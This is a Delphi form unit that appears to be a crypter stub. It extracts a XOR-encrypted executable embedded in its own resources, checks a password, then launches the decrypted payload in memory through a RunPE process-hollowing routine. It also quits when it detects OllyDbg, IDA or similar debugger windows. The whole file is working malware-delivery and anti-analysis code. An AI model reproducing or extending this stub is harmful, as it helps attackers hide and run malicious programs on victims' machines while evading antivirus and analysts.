unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, uRunPE, StdCtrls, EditRexe, XPMan, ShellApi, ComCtrls;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    Password: TEdit;
    OKBtn: TButton;
    Panel1: TPanel;
    Image1: TImage;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    StatusBar1: TStatusBar;
    Button1: TButton;
    procedure OKBtnClick(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Buffer :String;
  bBuff  :TByteArray;

implementation

{$R *.dfm}

function Xorit(Buffer :String; Key :Integer) :String;
var
  i,c,x  :Integer;
begin
  for i := 1 to Length(Buffer) do
  begin
    c := Integer(Buffer[i]);
    x := c xor Key;
    Result := Result + Char(x);
  end;
end;

function StrToByteArray(Str: string) :TByteArray;
begin
   SetLength(result, Length(Str));
   CopyMemory(@Result[0], @Str[1], Length(Str));
end;

procedure TForm1.OKBtnClick(Sender: TObject);
var
PW, FE : string;
begin
  Screen.Cursor := crHourGlass;
  ExtractFromExe('PW',PW);
  ExtractFromExe('FE',FE);
  If Password.Text=Xorit(PW, 125684) then begin
     Buffer := FE;
     Buffer := Xorit(Buffer, 1337);
     bBuff := StrToByteArray(Buffer);
     RunExe(ParamStr(0), bBuff);
     Screen.Cursor := crDefault;
     Form1.Close
end;
Form1.Close
end;

procedure TForm1.FormActivate(Sender: TObject);
begin
  if  FindWindow('OllyDbg', nil)
    + FindWindow('TIdaWindow', nil)
    + FindWindow('OWL_Window', nil) <> 0 then
          Application.Terminate;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  Application.Terminate;
end;

end.
